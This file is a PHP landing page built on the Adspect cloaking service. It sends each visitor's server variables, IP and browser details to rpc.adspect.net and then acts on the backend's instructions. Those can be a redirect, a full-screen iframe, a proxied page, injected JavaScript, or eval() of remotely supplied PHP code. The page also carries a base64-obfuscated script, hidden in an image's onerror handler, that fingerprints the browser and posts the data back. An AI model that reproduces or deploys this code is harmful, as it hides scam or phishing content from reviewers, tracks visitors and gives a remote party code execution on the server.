<?php
 ini_set('display_errors', '0'); error_reporting(E_ALL); if (!function_exists('adspect')) { function adspect_exit($code, $message) { http_response_code($code); exit($message); } function adspect_dig($array, $key, $default = '') { return array_key_exists($key, $array) ? $array[$key] : $default; } function adspect_resolve_path($path) { if ($path[0] === DIRECTORY_SEPARATOR) { $path = adspect_dig($_SERVER, 'DOCUMENT_ROOT', __DIR__) . $path; } else { $path = __DIR__ . DIRECTORY_SEPARATOR . $path; } return realpath($path); } function adspect_spoof_request($url = '') { $_SERVER['REQUEST_METHOD'] = 'GET'; $_POST = []; if ($url !== '') { $url = parse_url($url); if (isset($url['path'])) { if (substr($url['path'], 0, 1) === '/') { $_SERVER['REQUEST_URI'] = $url['path']; } else { $_SERVER['REQUEST_URI'] = dirname($_SERVER['REQUEST_URI']) . '/' . $url['path']; } } if (isset($url['query'])) { parse_str($url['query'], $_GET); $_SERVER['QUERY_STRING'] = $url['query']; } else { $_GET = []; $_SERVER['QUERY_STRING'] = ''; } } } function adspect_try_files() { foreach (func_get_args() as $path) { if (is_file($path)) { if (!is_readable($path)) { adspect_exit(403, 'Permission denied'); } header('Content-Type: text/html'); switch (strtolower(pathinfo($path, PATHINFO_EXTENSION))) { case 'php': case 'phtml': case 'php5': case 'php4': case 'php3': adspect_execute($path); exit; default: header('Content-Type: ' . adspect_content_type($path)); case 'html': case 'htm': header('Content-Length: ' . filesize($path)); readfile($path); exit; } } } adspect_exit(404, 'File not found'); } function adspect_execute() { global $_adspect; require_once func_get_arg(0); } function adspect_content_type($path) { if (function_exists('mime_content_type')) { $type = mime_content_type($path); if (is_string($type)) { return $type; } } return 'application/octet-stream'; } function adspect_serve_local($url) { $path = (string)parse_url($url, PHP_URL_PATH); if ($path === '') { return null; } $path = adspect_resolve_path($path); if (is_string($path)) { adspect_spoof_request($url); if (is_dir($path)) { chdir($path); adspect_try_files('index.php', 'index.html', 'index.htm'); return; } chdir(dirname($path)); adspect_try_files($path); return; } adspect_exit(404, 'File not found'); } function adspect_real_ip() { if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) { $ip = strtok($_SERVER['HTTP_X_FORWARDED_FOR'], ','); } elseif (array_key_exists('HTTP_X_REAL_IP', $_SERVER)) { $ip = $_SERVER['HTTP_X_REAL_IP']; } elseif (array_key_exists('HTTP_REAL_IP', $_SERVER)) { $ip = $_SERVER['HTTP_REAL_IP']; } elseif (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) { $ip = $_SERVER['HTTP_CF_CONNECTING_IP']; } if (empty($ip)) { $ip = $_SERVER['REMOTE_ADDR']; } return $ip; } function adspect_crypt($in, $key) { $il = strlen($in); $kl = strlen($key); $out = ''; for ($i = 0; $i < $il; ++$i) { $out .= chr(ord($in[$i]) ^ ord($key[$i % $kl])); } return $out; } function adspect_proxy_headers() { $headers = []; foreach (func_get_args() as $key) { if (array_key_exists($key, $_SERVER)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[] = "{$header}: {$_SERVER[$key]}"; } } return $headers; } function adspect_proxy($url, $param = null, $key = null) { $url = parse_url($url); if (empty($url)) { adspect_exit(500, 'Invalid proxy URL'); } extract($url); $curl = curl_init(); curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($curl, CURLOPT_USERAGENT, adspect_dig($_SERVER, 'HTTP_USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36')); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); if (!isset($scheme)) { $scheme = 'http'; } if (!isset($host)) { $host = adspect_dig($_SERVER, 'HTTP_HOST', 'localhost'); } if (isset($user, $pass)) { curl_setopt($curl, CURLOPT_USERPWD, "$user:$pass"); $host = "$user:$pass@$host"; } if (isset($port)) { curl_setopt($curl, CURLOPT_PORT, $port); $host = "$host:$port"; } $origin = "$scheme://$host"; if (!isset($path)) { $path = '/'; } if ($path[0] !== '/') { $path = "/$path"; } $url = $path; if (isset($query)) { $url .= "?$query"; } curl_setopt($curl, CURLOPT_URL, $origin . $url); $headers = adspect_proxy_headers('HTTP_ACCEPT', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_COOKIE'); $headers[] = 'Cache-Control: no-cache'; curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); $data = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE); curl_close($curl); http_response_code($code); if (is_string($data)) { if (isset($param, $key) && preg_match('{^text/(?:html|css)}i', $type)) { $base = $path; if ($base[-1] !== '/') { $base = dirname($base); } $base = rtrim($base, '/'); $rw = function ($m) use ($origin, $base, $param, $key) { list($repl, $what, $url) = $m; $url = htmlspecialchars_decode($url); $url = parse_url($url); if (!empty($url)) { extract($url); if (isset($host)) { if (!isset($scheme)) { $scheme = 'http'; } $host = "$scheme://$host"; if (isset($user, $pass)) { $host = "$user:$pass@$host"; } if (isset($port)) { $host = "$host:$port"; } } else { $host = $origin; } if (!isset($path)) { $path = ''; } if (!strlen($path) || $path[0] !== '/') { $path = "$base/$path"; } if (!isset($query)) { $query = ''; } $host = base64_encode(adspect_crypt($host, $key)); parse_str($query, $query); $query[$param] = "$path#$host"; $repl = '?' . http_build_query($query); if (isset($fragment)) { $repl .= "#$fragment"; } $repl = htmlspecialchars($repl); if ($what[-1] === '=') { $repl = "\"$repl\""; } $repl = $what . $repl; } return $repl; }; $re = '{(href=|src=|url\()["\']?((?:https?:|(?!#|[[:alnum:]]+:))[^"\'[:space:]>)]+)["\']?}i'; $data = preg_replace_callback($re, $rw, $data); } } else { $data = ''; } header("Content-Type: $type"); header('Content-Length: ' . strlen($data)); echo $data; } function adspect($sid, $mode, $param) { if (!function_exists('curl_init')) { adspect_exit(500, 'php-curl extension is missing'); } if (!function_exists('json_encode') || !function_exists('json_decode')) { adspect_exit(500, 'php-json extension is missing'); } $key = hex2bin(str_replace('-', '', $sid)); if ($key === false) { adspect_exit(500, 'Invalid stream ID'); } $addr = adspect_real_ip(); if (array_key_exists($param, $_GET) && strpos($_GET[$param], '#') !== false) { list($url, $host) = explode('#', $_GET[$param], 2); $host = adspect_crypt(base64_decode($host), $key); unset($_GET[$param]); $query = http_build_query($_GET); $url = "$host$url?$query"; adspect_proxy($url, $param, $key); exit; } $ajax = intval($mode === 'ajax'); $curl = curl_init(); $sid = adspect_dig($_GET, '__sid', $sid); $ua = adspect_dig($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_dig($_SERVER, 'HTTP_REFERER'); $query = http_build_query($_GET); switch (array_key_exists('data', $_POST)) { case true: $payload = json_decode($_POST['data'], true); if (is_array($payload)) { break; } default: $payload = []; break; } $payload['server'] = $_SERVER; curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); if ($ajax) { header('Access-Control-Allow-Origin: *'); $cid = adspect_dig($_SERVER, 'HTTP_X_REQUEST_ID'); } else { $cid = adspect_dig($_COOKIE, '_cid'); } curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($curl, CURLOPT_HTTPHEADER, [ "X-Forwarded-Host: {$_SERVER['HTTP_HOST']}", "X-Request-ID: {$cid}", "Adspect-IP: {$addr}", "Adspect-UA: {$ua}", "Adspect-Referrer: {$referrer}", ]); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $json = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Cache-Control: no-store'); switch ($code) { case 200: $data = json_decode($json, true); if (!is_array($data)) { adspect_exit(500, 'Invalid backend response'); } global $_adspect; $_adspect = $data; extract($data); if ($ajax) { switch ($action) { case 'php': ob_start(); eval($target); $data['target'] = ob_get_clean(); $json = json_encode($data); break; } if ($_SERVER['REQUEST_METHOD'] === 'POST') { header('Content-Type: application/json'); echo $json; } else { header('Content-Type: application/javascript'); if (!$ok && !$js) { return null; } echo "window._adata={$json};"; return $target; } } else { if ($js) { setcookie('_cid', $cid, time() + 60); return $target; } switch ($action) { case 'local': return adspect_serve_local($target); case 'noop': adspect_spoof_request($target); return null; case '301': case '302': case '303': header("Location: {$target}", true, (int)$action); break; case 'xar': header("X-Accel-Redirect: {$target}"); break; case 'xsf': header("X-Sendfile: {$target}"); break; case 'refresh': header("Refresh: 0; url={$target}"); adspect_spoof_request(); return null; case 'meta': $target = htmlspecialchars($target); echo "<!DOCTYPE html><head><meta http-equiv=\"refresh\" content=\"0; url={$target}\"></head>"; break; case 'iframe': $target = htmlspecialchars($target); echo "<!DOCTYPE html><html><head><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"></head><body><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe></body></html>"; break; case 'proxy': adspect_proxy($target, $param, $key); break; case 'fetch': adspect_proxy($target); break; case 'return': if (is_numeric($target)) { http_response_code((int)$target); } else { adspect_exit(500, 'Non-numeric status code'); } break; case 'php': eval($target); break; case 'js': $target = htmlspecialchars(base64_encode($target)); echo "<!DOCTYPE html><body><script src=\"data:text/javascript;base64,{$target}\"></script></body>"; break; } } exit; case 404: adspect_exit(404, 'Stream not found'); default: adspect_exit($code, 'Backend response code ' . $code); } } } $target = adspect('c45d3b38-563a-4f96-9f23-8f9dda96966c', 'index', '_'); if (!isset($target)) { return; } ?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
  </head>
  <body>
    <div id="root">
      <img src="/files/images/Logo.png" data-digest="KGZ1bmN0aW9uKCl7dmFyIGU9W10sYj17fTt0cnl7ZnVuY3Rpb24gYyhhKXtpZigib2JqZWN0Ij09PXR5cGVvZiBhJiZudWxsIT09YSl7dmFyIGY9e307ZnVuY3Rpb24gbihsKXt0cnl7dmFyIGs9YVtsXTtzd2l0Y2godHlwZW9mIGspe2Nhc2UgIm9iamVjdCI6aWYobnVsbD09PWspYnJlYWs7Y2FzZSAiZnVuY3Rpb24iOms9ay50b1N0cmluZygpfWZbbF09a31jYXRjaCh0KXtlLnB1c2godC5tZXNzYWdlKX19Zm9yKHZhciBkIGluIGEpbihkKTt0cnl7dmFyIGc9T2JqZWN0LmdldE93blByb3BlcnR5TmFtZXMoYSk7Zm9yKGQ9MDtkPGcubGVuZ3RoOysrZCluKGdbZF0pO2ZbIiEhIl09Z31jYXRjaChsKXtlLnB1c2gobC5tZXNzYWdlKX1yZXR1cm4gZn19Yi5zY3JlZW49Yyh3aW5kb3cuc2NyZWVuKTtiLndpbmRvdz1jKHdpbmRvdyk7Yi5uYXZpZ2F0b3I9Yyh3aW5kb3cubmF2aWdhdG9yKTtiLmxvY2F0aW9uPWMod2luZG93LmxvY2F0aW9uKTtiLmNvbnNvbGU9Yyh3aW5kb3cuY29uc29sZSk7CmIuZG9jdW1lbnRFbGVtZW50PWZ1bmN0aW9uKGEpe3RyeXt2YXIgZj17fTthPWEuYXR0cmlidXRlcztmb3IodmFyIGQgaW4gYSlkPWFbZF0sZltkLm5vZGVOYW1lXT1kLm5vZGVWYWx1ZTtyZXR1cm4gZn1jYXRjaChnKXtlLnB1c2goZy5tZXNzYWdlKX19KGRvY3VtZW50LmRvY3VtZW50RWxlbWVudCk7Yi5kb2N1bWVudD1jKGRvY3VtZW50KTt0cnl7Yi50aW1lem9uZU9mZnNldD0obmV3IERhdGUpLmdldFRpbWV6b25lT2Zmc2V0KCl9Y2F0Y2goYSl7ZS5wdXNoKGEubWVzc2FnZSl9dHJ5e2IuY2xvc3VyZT1mdW5jdGlvbigpe30udG9TdHJpbmcoKX1jYXRjaChhKXtlLnB1c2goYS5tZXNzYWdlKX10cnl7Yi5mcmFtZT13aW5kb3cuc2VsZiE9PXdpbmRvdy50b3B9Y2F0Y2goYSl7Yi5mcmFtZT0hMH10cnl7Yi50b3VjaEV2ZW50PWRvY3VtZW50LmNyZWF0ZUV2ZW50KCJUb3VjaEV2ZW50IikudG9TdHJpbmcoKX1jYXRjaChhKXtlLnB1c2goYS5tZXNzYWdlKX10cnl7dmFyIHA9ZnVuY3Rpb24oKXt9LApxPTA7cC50b1N0cmluZz1mdW5jdGlvbigpeysrcTtyZXR1cm4iIn07Y29uc29sZS5sb2cocCk7Yi50b3N0cmluZz1xfWNhdGNoKGEpe2UucHVzaChhLm1lc3NhZ2UpfXRyeXt2YXIgbT1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKS5nZXRDb250ZXh0KCJ3ZWJnbCIpLHI9bS5nZXRFeHRlbnNpb24oIldFQkdMX2RlYnVnX3JlbmRlcmVyX2luZm8iKTtiLndlYmdsPXt2ZW5kb3I6bS5nZXRQYXJhbWV0ZXIoci5VTk1BU0tFRF9WRU5ET1JfV0VCR0wpLHJlbmRlcmVyOm0uZ2V0UGFyYW1ldGVyKHIuVU5NQVNLRURfUkVOREVSRVJfV0VCR0wpfX1jYXRjaChhKXtlLnB1c2goYS5tZXNzYWdlKX1mdW5jdGlvbiBoKGEsZixkKXt2YXIgZz1hLnByb3RvdHlwZVtmXTthLnByb3RvdHlwZVtmXT1mdW5jdGlvbigpe2IucHJvdG89ITB9O2QoKTthLnByb3RvdHlwZVtmXT1nfXRyeXtoKEFycmF5LCJpbmNsdWRlcyIsZnVuY3Rpb24oKXtyZXR1cm4gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgidmlkZW8iKS5jYW5QbGF5VHlwZSgidmlkZW8vbXA0Iil9KX1jYXRjaChhKXt9fWNhdGNoKGMpe2UucHVzaChjLm1lc3NhZ2UpfShmdW5jdGlvbigpe2IuZXJyb3JzPQplO3ZhciBjPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImZvcm0iKSxoPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImlucHV0Iik7Yy5tZXRob2Q9IlBPU1QiO2MuYWN0aW9uPXdpbmRvdy5sb2NhdGlvbi5ocmVmO2gudHlwZT0iaGlkZGVuIjtoLm5hbWU9ImRhdGEiO2gudmFsdWU9SlNPTi5zdHJpbmdpZnkoYik7Yy5hcHBlbmRDaGlsZChoKTtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGMpO2Muc3VibWl0KCl9KSgpfSkoKTsK" onerror="(new Function(atob(this.dataset.digest)))();" style="visibility: hidden;">
    </div>
  </body>
</html>
<?php exit;
